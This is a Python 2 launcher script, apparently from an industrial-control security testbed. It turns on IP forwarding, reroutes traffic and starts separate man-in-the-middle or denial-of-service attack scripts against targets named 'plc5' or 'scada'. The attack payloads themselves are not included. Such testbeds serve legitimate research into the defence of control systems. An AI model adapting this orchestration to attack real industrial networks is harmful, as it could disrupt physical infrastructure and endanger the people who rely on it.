import subprocess
import shlex
import argparse
import sys

class MitmAttack():
    def start_forwarding(self):
        args = shlex.split("sysctl -w net.ipv4.ip_forward=1")
        subprocess.call(args, shell=False)

    def configure_routing(self):
        if self.target == 'scada':
            subprocess.call(['route', 'add', 'default', 'gw', '192.168.2.254', 'attacker2-eth0'], shell=False)

    def launch_mitm(self):
        self.configure_routing()
        self.mitm_file = open("mitm_file.log", 'r+')
        mitm_cmd = shlex.split("../../../attack-experiments/env/bin/python "
                               "mitm_attack.py " + str(self.target))
        print 'Running MiTM attack with command ' + str(mitm_cmd)

        mitm_process = subprocess.Popen(mitm_cmd, shell=False)
        return mitm_process

    def launch_dos(self):
        print 'Running DoS attack...'
        dos = subprocess.Popen(["../../../attack-experiments/env/bin/python", 'dos.py'])
        return dos

    def main(self):
        args = self.get_arguments()
        self.process_arguments(args)

        if self.attack == "mitm":
            self.start_forwarding()
            attack_process = self.launch_mitm()
            print "Automatic Ctown mitm attack: Launched attack"
            attack_process.wait()
            print "Stopping Attack process..."

        elif self.attack == "dos":
            self.start_forwarding()
            dos  = self.launch_dos()
            dos.wait()
        else:
            print 'No attack was specified, exiting...'
            sys.exit(1)

    def process_arguments(self,arg_parser):
        if arg_parser.attack:
            self.attack = arg_parser.attack
        else:
            self.attack = 'mitm'

        if arg_parser.target:
            self.target = arg_parser.target
        else:
            self.target = 'plc5'

    def get_arguments(self):
        parser = argparse.ArgumentParser(description='Master Script that launches LAN communication attacks')
        parser.add_argument("--attack", "-a",help="Attack to be launched, options can be mitm or dos")
        parser.add_argument("--target", "-t", help="target of the attack, current valid values are plc5 or scada")
        return parser.parse_args()

if __name__ == "__main__":
    mitm = MitmAttack()
    mitm.main()